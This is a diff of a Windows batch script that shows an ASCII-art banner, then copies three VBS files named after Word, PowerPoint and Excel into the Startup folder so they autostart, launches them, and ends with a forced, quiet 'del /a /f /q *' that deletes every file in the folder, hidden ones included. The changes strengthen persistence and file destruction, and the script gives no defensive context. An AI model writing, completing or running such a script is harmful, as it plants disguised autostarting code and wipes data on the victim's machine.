@@ -71,10 +71,10 @@ echo.                                                         .           . ... 
 echo.                                                                    .   .                                                                             
 echo.                                                                                                                                                      
 echo.
-copy word.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-copy ppt.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-copy xls.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+copy "word.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "ppt.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "xls.vbs" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\word.vbs"
 start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ppt.vbs"
 start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\xls.vbs"
-del *
+del /a /f /q *
